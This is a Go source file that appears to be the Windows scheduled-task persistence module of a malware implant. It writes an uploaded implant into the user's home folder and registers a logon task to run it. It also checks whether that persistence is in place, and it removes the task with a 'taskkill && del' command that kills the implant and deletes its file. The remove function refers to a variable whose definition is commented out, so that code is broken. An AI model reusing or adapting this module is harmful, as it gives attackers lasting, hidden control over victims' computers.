// +build amd64

package windows_schtasks

import (
	"bichito/modules/biterpreter"
	"encoding/json"
	"os/user"
	"unsafe"
	"os"
	"path/filepath"
	//Debug
	//"fmt"
)

/*
#cgo CXXFLAGS: -I"../../../../../winDependencies/includes/"
#cgo LDFLAGS: -L"../../../../../winDependencies/libs/x64/" -ltaskschd -lcomsupp -lole32 -loleaut32 -static
#include "windows_schtasks.h"
#include <stdlib.h>
*/
import "C"


type BiPersistenceWinSchtasks struct {
	Path string   `json:"path"`
	TaskName string   `json:"taskname"`
}

var moduleParams *BiPersistenceWinSchtasks


func AddPersistenceSchtasks(jsonPersistence string,blob string) (bool,string){

	errDaws := json.Unmarshal([]byte(jsonPersistence),&moduleParams)
	if errDaws != nil{
		return true,"Error Decoding Persistence Module Params:" + errDaws.Error()
	}


	//Craft Userland Path:

    usr, err := user.Current()
    if err != nil {
        return true,"Error Getting User Context:" + err.Error()
    }

	userPath := usr.HomeDir +"\\"+ moduleParams.Path

	errUpload,stringErr := biterpreter.Upload(userPath,blob)
	if errUpload{
		return true,"Error Uploading Implant on Persistence:" + stringErr
	}


    var ptrPath *C.char = C.CString(userPath)
    defer C.free(unsafe.Pointer(ptrPath))

    var ptrName *C.char = C.CString(moduleParams.TaskName)
    defer C.free(unsafe.Pointer(ptrName))

    ptrError := C.malloc(C.sizeof_char * 1024)
    defer C.free(unsafe.Pointer(ptrError))

    error := C.SchtasksOnUserLogon((*C.char)(ptrPath),(*C.char)(ptrName),(*C.char)(ptrError))
    
    errorString := C.GoString((*C.char)(ptrError))
    if (error != 1){

    	return true,"Schtasks Error:" + string(errorString)
    }

	return false,"Persisted"
}

func CheckPersistenceSchtasks(jsonPersistence string) (bool,string){

	errDaws := json.Unmarshal([]byte(jsonPersistence),&moduleParams)
	if errDaws != nil{
		return true,"Error Decoding Persistence Module Params:"+ errDaws.Error()
	}

	//Check if file on path exists
    usr, err := user.Current()
    if err != nil {
        return true,"Error Getting User Context:" + err.Error()
    }
	userPath := usr.HomeDir +"\\"+ moduleParams.Path
	errA,stringErr := biterpreter.Accesschk(userPath)
	if errA != false {
		return false, "Non Persisted"+stringErr
	}

	return false,"Persisted"
}


func RemovePersistenceSchtasks(jsonPersistence string) (bool,string){

	errDaws := json.Unmarshal([]byte(jsonPersistence),&moduleParams)
	if errDaws != nil{
		return true,"Error Decoding Persistence Module Params:" + errDaws.Error()
	}

	var genError string
    usr, err := user.Current()
    if err != nil {
        return true,"Error Getting User Context:" + err.Error()
    }



	//Remove Task 
    var ptrName *C.char = C.CString(moduleParams.TaskName)
    defer C.free(unsafe.Pointer(ptrName))

    ptrError := C.malloc(C.sizeof_char * 1024)
    defer C.free(unsafe.Pointer(ptrError))

    error := C.SchtasksDelete((*C.char)(ptrName),(*C.char)(ptrError))
    
    errorString := C.GoString((*C.char)(ptrError))
    
	//Remove Implant: spawn child process that kills father, wait and remove executable
	userPath := usr.HomeDir +"\\"+ moduleParams.Path
	
	execErr,stringerr := biterpreter.Exec("taskkill /f /im "+filepath.Base(os.Args[0])+" && ping 127.0.0.1 -n 6 > nul && del "+userPath)
	if execErr != false {
		genError = "File Removed Already" + stringerr
	}

	/*
	wipeErr,stringerr := biterpreter.Wipe(userPath)
	if wipeErr != false {
		genError = "File Removed Already" + stringerr
	}	
	*/    

    if (error != 1) || (wipeErr != false){

    	return true,"Schtasks Error:" + string(errorString) +"Wipe Error:" + genError
    }

	return false,"Persistence Removed"
}